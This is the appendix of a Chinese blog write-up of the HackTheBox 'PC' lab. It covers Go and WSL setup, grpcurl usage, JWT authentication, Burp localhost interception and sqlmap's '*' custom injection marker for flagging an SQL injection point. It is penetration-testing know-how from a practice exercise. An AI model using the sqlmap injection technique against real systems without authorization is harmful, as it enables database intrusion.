<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure>

<h4 id="环境变量问题"><a href="#环境变量问题" class="headerlink" title="环境变量问题"></a>环境变量问题</h4><p>因为作者实在 WSL 中运行的 go ，所以还需要配置对应的 go 的环境变量。正确的配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># set go PATH</span><br><span class="line">export GOROOT=/usr/local/go</span><br><span class="line">export GOPATH=/home/kali/go</span><br><span class="line">export PATH=$GOPATH/bin:$GOROOT/bin:$PATH</span><br></pre></td></tr></table></figure>

<p>注意，<code>$PATH</code> 应该放在后方而不是前方，不然在 WSL 环境下会报错。这是因为 WSL 的环境变量还包括了 Windows 的环境变量。</p>
<h3 id="grpcurl-工具使用"><a href="#grpcurl-工具使用" class="headerlink" title="grpcurl 工具使用"></a>grpcurl 工具使用</h3><p>安装好 <code>grpcurl</code> 后，使用 <code>-h</code> 参数，可以看到相关说明如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ grpcurl -h</span><br><span class="line">Usage:</span><br><span class="line"></span><br><span class="line">grpcurl [flags] [address] [list|describe] [symbol]</span><br><span class="line"></span><br><span class="line">The &#x27;address&#x27; is only optional when used with &#x27;list&#x27; or &#x27;describe&#x27; and a</span><br><span class="line">protoset or proto flag is provided.</span><br><span class="line"></span><br><span class="line">If &#x27;list&#x27; is indicated, the symbol (if present) should be a fully-qualified</span><br><span class="line">service name. If present, all methods of that service are listed. If not</span><br><span class="line">present, all exposed services are listed, or all services defined in protosets.</span><br><span class="line"></span><br><span class="line">If &#x27;describe&#x27; is indicated, the descriptor for the given symbol is shown. The</span><br><span class="line">symbol should be a fully-qualified service, enum, or message name. If no symbol</span><br><span class="line">is given then the descriptors for all exposed or known services are shown.</span><br><span class="line"></span><br><span class="line">If neither verb is present, the symbol must be a fully-qualified method name in</span><br><span class="line">&#x27;service/method&#x27; or &#x27;service.method&#x27; format. In this case, the request body will</span><br><span class="line">be used to invoke the named method. If no body is given but one is required</span><br><span class="line">(i.e. the method is unary or server-streaming), an empty instance of the</span><br><span class="line">method&#x27;s request type will be sent.</span><br><span class="line"></span><br><span class="line">The address will typically be in the form &quot;host:port&quot; where host can be an IP</span><br><span class="line">address or a hostname and port is a numeric port or service name. If an IPv6</span><br><span class="line">address is given, it must be surrounded by brackets, like &quot;[2001:db8::1]&quot;. For</span><br><span class="line">Unix variants, if a -unix=true flag is present, then the address must be the</span><br><span class="line">path to the domain socket.</span><br></pre></td></tr></table></figure>

<h3 id="JWT-定义"><a href="#JWT-定义" class="headerlink" title="JWT 定义"></a>JWT 定义</h3><h4 id="用户认证机制"><a href="#用户认证机制" class="headerlink" title="用户认证机制"></a>用户认证机制</h4><p>一般用户认证机制：</p>
<ol>
<li><p>用户向服务器发送用户名和密码。</p>
</li>
<li><p>服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。</p>
</li>
<li><p>服务器向用户返回一个 <code>session_id</code> ，写入用户的 Cookie。</p>
</li>
<li><p>用户随后的每一次请求，都会通过 Cookie，将 <code>session_id</code> 传回服务器。</p>
</li>
<li><p>服务器收到 <code>session_id</code> ，找到前期保存的数据，由此得知用户的身份。</p>
</li>
</ol>
<h4 id="JWT-认证机制"><a href="#JWT-认证机制" class="headerlink" title="JWT 认证机制"></a>JWT 认证机制</h4><p>JWT（JSON Web Token）是一种用于在网络上进行安全传输的开放标准（RFC 7519）。它是一种基于 JSON 的令牌，用于在客户端和服务器之间传递声明。JWT 通常用于身份验证和授权，可以帮助在不同的系统之间安全地传输信息。</p>
<p>JWT由三部分组成：头部（Header）、载荷（Payload）和签名（Signature）。头部包含描述JWT的元数据，例如算法和令牌类型。载荷包含要传输的声明，例如用户ID、角色等。签名用于验证JWT的真实性。</p>
<p><img src="https://pic.imgdb.cn/item/64a99caa1ddac507cceedda2.jpg" alt="JWT结构"></p>
<p>JWT的工作流程如下：</p>
<ol>
<li>用户通过用户名和密码进行身份验证。</li>
<li>服务器验证用户的身份，并生成一个 JWT 。</li>
<li>服务器将 JWT 发送给客户端。</li>
<li>客户端将 JWT 保存在本地，例如在浏览器的本地存储或Cookie中。</li>
<li>客户端在每次请求时将 JWT 作为 <code>Authorization</code> 头部的 <code>Bearer</code> 令牌发送给服务器。</li>
<li>服务器验证 JWT 的签名，并根据其中的声明进行授权。</li>
</ol>
<p>客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p>
<p>此后，客户端每次与服务器通信，都要带上这个 JWT。你可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求的头信息 <code>Authorization</code> 字段里面。</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Authorization</span>: <span class="title class_">Bearer</span> &lt;token&gt;</span><br></pre></td></tr></table></figure>

<p>另一种做法是，跨域的时候，JWT 就放在 POST 请求的数据体里面。</p>
<h3 id="Burp与SwitchOmega-如何抓本地包"><a href="#Burp与SwitchOmega-如何抓本地包" class="headerlink" title="Burp与SwitchOmega 如何抓本地包"></a>Burp与SwitchOmega 如何抓本地包</h3><p>抓取发回到本地包出现了问题：无法抓取到发向本地包。</p>
<p>我使用的环境为：<code>Chrome</code> + <code>SwitchOmega</code> ，以往使用 <code>phpstudy</code> 时抓取本地包我都是直接访问本地 IP 地址，而非 <code>127.0.0.1</code> 或者 <code>localhost</code> 。但此次踩坑情况与以往并不相同，拓扑图如下：</p>
<p><img src="https://pic.imgdb.cn/item/64aa98401ddac507cc8a193c.jpg" alt="本地包抓取"></p>
<p>最终翻看 Google 和 StackOverflow 后，找到了一个解决方法：<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/55616614/burp-interception-does-not-work-for-localhost-in-chrome">Burp Interception does not work for localhost in Chrome</a>，即删掉本地代理的过滤：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># remove the filtering on the local proxy</span><br><span class="line">127.0.0.1</span><br><span class="line">::1</span><br><span class="line">localhost</span><br><span class="line"># change the settings to loopback</span><br><span class="line">&lt;-loopback&gt;</span><br></pre></td></tr></table></figure>

<p>这是因为——[待填坑]</p>
<p>在Windows中设置代理不过滤选项为”&lt;-loopback&gt;”的意义是为了防止本地回环（loopback）地址被代理过滤。本地回环地址是指网络上的特殊IP地址，即127.0.0.1，用于在同一台计算机上进行内部通信。</p>
<p>当设置代理不过滤选项为”&lt;-loopback&gt;”时，代理服务器将不会对本地回环地址进行代理过滤。这意味着在使用代理的情况下，您仍然可以通过本地回环地址进行本地网络通信，而无需经过代理服务器。</p>
<h3 id="sqlmap-自定义注入标记"><a href="#sqlmap-自定义注入标记" class="headerlink" title="sqlmap 自定义注入标记"></a>sqlmap 自定义注入标记</h3><p>在 sqlmap 中，自定义注入标记（Custom Injection Marker）是一个用于标记注入点的字符串，sqlmap 将会通过查找该字符串来确定注入点的位置。默认情况下，sqlmap使用 <code>*</code> 作为自定义注入标记。</p>
<p>例如，<code>http://example.com/vuln.php?id=1</code> 的注入点在 <code>id</code> 处，将URL修改为 <code>http://example.com/vuln.php?id=*</code> ， sqlmap 就会自动识别注入点了。</p>
<p>如果目标URL中包含 <code>*</code> 字符，需要将其转义为 <code>\*</code> 。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://peonycsa.com">Peony</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://peonycsa.com/2023/07/10/HTB-PC%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/">https://peonycsa.com/2023/07/10/HTB-PC%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://peonycsa.com" target="_blank">Peony</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WriteUp/">WriteUp</a><a class="post-meta__tags" href="/tags/HackTheBox/">HackTheBox</a><a class="post-meta__tags" href="/tags/PC/">PC</a></div><div class="post_share"><div class="social-share" data-image="https://pic.imgdb.cn/item/64aaeb061ddac507cc460e7c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://fastly.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/06/%E8%B0%83%E8%8A%82%E5%8E%8B%E5%8A%9B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" title="调节压力课程笔记"><img class="cover" src="https://pic.imgdb.cn/item/64f84659661c6c8e54f93782.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">调节压力课程笔记</div></div></a></div><div class="next-post pull-right"><a href="/2023/06/10/vulnhub-JARBAS%E9%80%9A%E5%85%B3/" title="vulnhub-JARBAS通关"><img class="cover" src="https://pic.imgdb.cn/item/653b2755c458853aef761f44.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">vulnhub-JARBAS通关</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/10/27/Vulnhub-KioptrixLevel1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="Vulnhub-KioptrixLevel1通关记录"><img class="cover" src="https://pic.imgdb.cn/item/653b2755c458853aef761f44.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-27</div><div class="title">Vulnhub-KioptrixLevel1通关记录</div></div></a></div><div><a href="/2023/06/10/vulnhub-JARBAS%E9%80%9A%E5%85%B3/" title="vulnhub-JARBAS通关"><img class="cover" src="https://pic.imgdb.cn/item/653b2755c458853aef761f44.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-10</div><div class="title">vulnhub-JARBAS通关</div></div></a></div><div><a href="/2023/04/18/vulnhub-Narak%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="vulnhub-Narak通关记录"><img class="cover" src="https://pic.imgdb.cn/item/647cc8931ddac507ccbda697.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-18</div><div class="title">vulnhub-Narak通关记录</div></div></a></div><div><a href="/2023/06/03/vulnhub-w1r3s%E9%80%9A%E5%85%B3/" title="vulnhub-w1r3s通关"><img class="cover" src="https://pic.imgdb.cn/item/647dcd281ddac507ccf5125c.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-03</div><div class="title">vulnhub-w1r3s通关</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic.imgdb.cn/item/647c139af024cca1732734de.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Peony</div><div class="author-info__description">知道自己需要的是什么之后，真正的学习才算开始。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Catsofsuffering"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Catsofsuffering" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:graywar1@163.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">靶机描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.</span> <span class="toc-text">nmap扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gRPC-%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.2.</span> <span class="toc-text">gRPC 服务探测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql-%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E7%AB%8B%E8%B6%B3%E7%82%B9"><span class="toc-number">3.</span> <span class="toc-text">sql 注入获取立足点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A"><span class="toc-number">4.</span> <span class="toc-text">注释</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hosts-%E6%96%87%E4%BB%B6%E4%BF%AE%E6%94%B9"><span class="toc-number">4.1.</span> <span class="toc-text">hosts 文件修改</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gRPC-%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.2.</span> <span class="toc-text">gRPC 服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#go-install-%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">4.3.</span> <span class="toc-text">go install 存在的问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E9%97%AE%E9%A2%98"><span class="toc-number">4.3.1.</span> <span class="toc-text">代理问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%97%AE%E9%A2%98"><span class="toc-number">4.3.2.</span> <span class="toc-text">环境变量问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#grpcurl-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">4.4.</span> <span class="toc-text">grpcurl 工具使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JWT-%E5%AE%9A%E4%B9%89"><span class="toc-number">4.5.</span> <span class="toc-text">JWT 定义</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6"><span class="toc-number">4.5.1.</span> <span class="toc-text">用户认证机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JWT-%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6"><span class="toc-number">4.5.2.</span> <span class="toc-text">JWT 认证机制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Burp%E4%B8%8ESwitchOmega-%E5%A6%82%E4%BD%95%E6%8A%93%E6%9C%AC%E5%9C%B0%E5%8C%85"><span class="toc-number">4.6.</span> <span class="toc-text">Burp与SwitchOmega 如何抓本地包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E5%85%A5%E6%A0%87%E8%AE%B0"><span class="toc-number">4.7.</span> <span class="toc-text">sqlmap 自定义注入标记</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/01/18/Splunk%E8%87%AA%E5%AE%9A%E4%B9%89%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E5%91%BD%E4%BB%A4/" title="Splunk自定义威胁情报命令"><img src="https://pic.imgdb.cn/item/64aae46e1ddac507cc3c4359.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Splunk自定义威胁情报命令"/></a><div class="content"><a class="title" href="/2024/01/18/Splunk%E8%87%AA%E5%AE%9A%E4%B9%89%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E5%91%BD%E4%BB%A4/" title="Splunk自定义威胁情报命令">Splunk自定义威胁情报命令</a><time datetime="2024-01-18T07:34:35.000Z" title="发表于 2024-01-18 15:34:35">2024-01-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/27/Vulnhub-KioptrixLevel1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="Vulnhub-KioptrixLevel1通关记录"><img src="https://pic.imgdb.cn/item/653b2755c458853aef761f44.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnhub-KioptrixLevel1通关记录"/></a><div class="content"><a class="title" href="/2023/10/27/Vulnhub-KioptrixLevel1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="Vulnhub-KioptrixLevel1通关记录">Vulnhub-KioptrixLevel1通关记录</a><time datetime="2023-10-27T02:45:07.000Z" title="发表于 2023-10-27 10:45:07">2023-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/27/Github%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E7%B4%A2/" title="Github敏感信息搜索"><img src="https://pic.imgdb.cn/item/64fa9349661c6c8e5490bd62.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Github敏感信息搜索"/></a><div class="content"><a class="title" href="/2023/10/27/Github%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E7%B4%A2/" title="Github敏感信息搜索">Github敏感信息搜索</a><time datetime="2023-10-27T02:38:07.000Z" title="发表于 2023-10-27 10:38:07">2023-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/27/%E8%BF%90%E7%BB%B4%E5%B0%8F%E6%8A%80%E5%B7%A7/" title="运维小技巧"><img src="https://pic.imgdb.cn/item/653b21d6c458853aef672984.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="运维小技巧"/></a><div class="content"><a class="title" href="/2023/10/27/%E8%BF%90%E7%BB%B4%E5%B0%8F%E6%8A%80%E5%B7%A7/" title="运维小技巧">运维小技巧</a><time datetime="2023-10-27T02:22:20.000Z" title="发表于 2023-10-27 10:22:20">2023-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/11/Vulnhub-SICKOSv1-1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="Vulnhub-SICKOSv1.1通关记录"><img src="https://pic.imgdb.cn/item/64aae46e1ddac507cc3c4359.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnhub-SICKOSv1.1通关记录"/></a><div class="content"><a class="title" href="/2023/09/11/Vulnhub-SICKOSv1-1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" title="Vulnhub-SICKOSv1.1通关记录">Vulnhub-SICKOSv1.1通关记录</a><time datetime="2023-09-11T07:32:20.000Z" title="发表于 2023-09-11 15:32:20">2023-09-11</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://pic.imgdb.cn/item/64aaeb061ddac507cc460e7c.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Peony</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://fastly.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div></div></body></html>